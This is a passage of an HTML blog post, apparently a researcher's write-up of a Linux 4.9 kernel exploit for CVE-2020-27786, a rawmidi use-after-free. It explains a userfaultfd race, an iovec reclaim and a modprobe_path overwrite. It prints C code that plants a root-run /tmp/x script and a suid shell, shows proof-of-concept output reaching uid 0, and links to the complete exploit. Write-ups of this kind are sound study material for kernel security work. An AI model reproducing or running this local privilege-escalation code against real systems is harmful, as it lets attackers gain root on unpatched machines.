</span></span><span class=line><span class=cl>        <span class=n>ssize_t</span> <span class=n>readv_res</span> <span class=o>=</span> <span class=n>readv</span><span class=p>(</span><span class=n>pipefd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>iov_read_buffers</span><span class=p>,</span> <span class=mi>13</span><span class=p>);</span> <span class=c1>// 13 * 16 = 208 =&gt; kmalloc-256
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The <code>readv</code> is a blocking call that <strong>stays</strong> (does not free) the object in the kernel so that we can corrupt it using our UAF and re-use it later with our arbitrary modified content. If we corrupt the <code>iov_base</code> of an <code>iovec</code> structure we can write at arbitrary kernel addresses with a <code>write</code> syscall since it is uses the unsafe
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/lib/iov_iter.c#L267 rel=noopener>__copy_from_user</a> (same as <code>copy_from_user</code> but without checks).</p><p><img src=/3.png width=auto></p><p>Our idea is:</p><ul><li>Resize the <code>runtime->buffer</code> with <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code> in order to lands into<code>kmalloc-256</code> with a size greater than 192</li><li><code>write</code> into the file descriptor specifycing a demanded-zero paged memory (<code>MAP_ANON</code>) so that <code>copy_from_user</code> will stop its execution waiting for our user-land page fault handler</li><li>While the kernel thread is waiting, free the buffer using again the re-size ioctl command <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code></li><li>Allocate the <code>iovec</code> struct using <code>readv</code> that will replace the previously allocated <code>runtime->buffer</code></li><li>Resume the kernel execution releasing the page fault handler. Now the <code>copy_from_user</code> will start to write into the <code>iovec</code> structure and we will overwrite <code>iov[1].iov_base</code> with the <code>modprobe_path</code> address.</li></ul><p>Now, in order to overwrite the <code>modprobe_path</code> value we just have to write our arbitrary content using the <code>write</code> syscall into <code>pipe[0]</code>. In the released exploit I overwrote the second iov entry (<code>iov[1]</code>) using the same technique described before with adjacent pages. However, it&rsquo;s also possible to directly overwrite the first <code>iov[0].iov_base</code>.</p><p>Nice ! Now we have overwritten <code>modprobe_path</code> with <code>/tmp/x</code> and .. it&rsquo;s time to pop a shell !</p><a href=#modprobe_path--uid0><h3 id=modprobe_path--uid0><span class=hanchor arialabel=Anchor># </span>modprobe_path & uid=0</h3></a><p>If you are not familiar with <code>modprobe_path</code> I suggest you to check out
<a href=https://syst3mfailure.io/hotrod rel=noopener>Exploiting timerfd_ctx Objects In The Linux Kernel</a> and the
<a href=https://man7.org/linux/man-pages/man2/userfaultfd.2.html rel=noopener>man page</a>.
To summarize, <code>modprobe_path</code> is a global variable with a default value of <code>/sbin/modprobe</code> used by <code>call_usermodehelper_exec</code> to execute a user-space program in case a program with an unkown header is executed.
Since we have overwritten <code>modprobe_path</code> with <code>/tmp/x</code>, when a file with an unknown header is executed, our controllable script is executed as root.</p><p>These are the exploit functions that prepares and later executes a suid shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=nf>prep_exploit</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;echo &#39;#!/bin/sh&#39; &gt; /tmp/x&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;echo &#39;touch /tmp/pwneed&#39; &gt;&gt; /tmp/x&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;echo &#39;chown root: /tmp/suid&#39; &gt;&gt; /tmp/x&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;echo &#39;chmod 777 /tmp/suid&#39; &gt;&gt; /tmp/x&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;echo &#39;chmod u+s /tmp/suid&#39; &gt;&gt; /tmp/x&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;echo -e &#39;</span><span class=se>\xdd\xdd\xdd\xdd\xdd\xdd</span><span class=s>&#39; &gt; /tmp/nnn&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;chmod +x /tmp/x&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;chmod +x /tmp/nnn&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>get_root_shell</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/tmp/nnn 2&gt;/dev/null&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/tmp/suid 2&gt;/dev/null&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=n>prep_exploit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=c1>// [..] exploit stuff
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>get_root_shell</span><span class=p>();</span> <span class=c1>// pop a root shell
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>What the exploit does is simply create the <code>/tmp/x</code> binary that will suid as root a file dropped in <code>/tmp/suid</code> and create a file with an unknown header (<code>/tmp/nnn</code>) that will trigger the executon as root of <code>/tmp/x</code> from <code>call_usermodehelper_exec</code>. After that, the <code>/tmp/suid</code> gives root privileges and spawns a root shell.</p><p>POC:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/ $ uname -a                                   
</span></span><span class=line><span class=cl>Linux <span class=o>(</span>none<span class=o>)</span> 4.9.223 <span class=c1>#3 SMP Wed Jun 1 23:15:02 CEST 2022 x86_64 GNU/Linux </span>
</span></span><span class=line><span class=cl>/ $ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>user<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span><span class=m>1000</span> <span class=nv>groups</span><span class=o>=</span><span class=m>1000</span>
</span></span><span class=line><span class=cl>/ $ /main 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting exploitation ..
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> userfaultfd registered
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> First write to init substream..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Resizing buffer_size to <span class=m>4096</span> ..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> snd_write triggered <span class=o>(</span>should fault<span class=o>)</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Freeing buf using SNDRV_RAWMIDI_IOCTL_PARAMS
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Page Fault triggered <span class=k>for</span> 0x5551000!
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Replacing freed obj with msg_msg .
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> userfaultd to finish ..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Page fault thread terminated
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Page fault lock released
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> init_ipc_ns @0xffffffff81e8d560
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> calculated modprobe_path @0xffffffff81e42a00
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting the arbitrary write phase ..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Closing and reopening re-opening rawmidi fd ..
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> userfaultfd registered
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> First write to init substream..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Resizing buffer_size to land into kmalloc-256 ..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> snd_write triggered <span class=o>(</span>should fault<span class=o>)</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Freeing buf from SNDRV_RAWMIDI_IOCTL_PARAMS
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Page Fault triggered <span class=k>for</span> 0x7771000!
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> readv ..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Page fault thread terminated
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Page fault lock released
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Writing into the pipe ..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=nv>write</span> <span class=o>=</span> <span class=m>24</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> enjoy your r00t shell <span class=o>[</span>:
</span></span><span class=line><span class=cl>/ <span class=c1># id</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span><span class=m>0</span> <span class=nv>groups</span><span class=o>=</span><span class=m>1000</span>
</span></span><span class=line><span class=cl>/ <span class=c1>#</span>
</span></span></code></pre></td></tr></table></div></div><a href=#conclusion><h2 id=conclusion><span class=hanchor arialabel=Anchor># </span>Conclusion</h2></a><p>That was my journey into exploiting a known vulnerability in the <code>4.9.223</code> kernel. You can find the whole exploit on github:
<a href=https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit rel=noopener>https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit</a>.</p><a href=#references><h2 id=references><span class=hanchor arialabel=Anchor># </span>References</h2></a><ul><li><a href=https://1day.dev/2022-06/1day-devel-part-1.html rel=noopener>https://1day.dev/2022-06/1day-devel-part-1.html</a></li><li><a href=https://elixir.bootlin.com/linux/v4.9.223/source/ rel=noopener>https://elixir.bootlin.com/linux/v4.9.223/source/</a></li><li><a href=https://lwn.net/Articles/819834/ rel=noopener>https://lwn.net/Articles/819834/</a></li><li><a href="https://www.youtube.com/watch?v=6dFmH_JEF4s" rel=noopener>https://www.youtube.com/watch?v=6dFmH_JEF4s</a></li><li><a href=https://blog.lizzie.io/using-userfaultfd.html rel=noopener>https://blog.lizzie.io/using-userfaultfd.html</a></li><li><a href=https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html rel=noopener>https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html</a></li><li><a href=https://syst3mfailure.io/wall-of-perdition rel=noopener>https://syst3mfailure.io/wall-of-perdition</a></li><li><a href=https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html rel=noopener>https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html</a></li><li><a href=https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer rel=noopener>https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer</a></li><li><a href=https://syst3mfailure.io/hotrod rel=noopener>https://syst3mfailure.io/hotrod</a></li><li><a href=https://man7.org/linux/man-pages/man2/userfaultfd.2.html rel=noopener>https://man7.org/linux/man-pages/man2/userfaultfd.2.html</a></li><li><a href=https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit rel=noopener>https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/ data-ctx="notes/Linux Kernel n-day exploit development" data-src=/ class=internal-link>ðŸ‘¾ KIKS.</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://1day.dev/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Powered by <a href=https://github.com/jackyzha0/quartz>Quartz</a>, Â© 2022</p><ul><li><a href=https://1day.dev/>Home</a></li><li><a href=https://twitter.com/kiks7_7>Twitter</a></li><li><a href=https://github.com/kiks7>Github</a></li></ul></footer></div></div></body></html>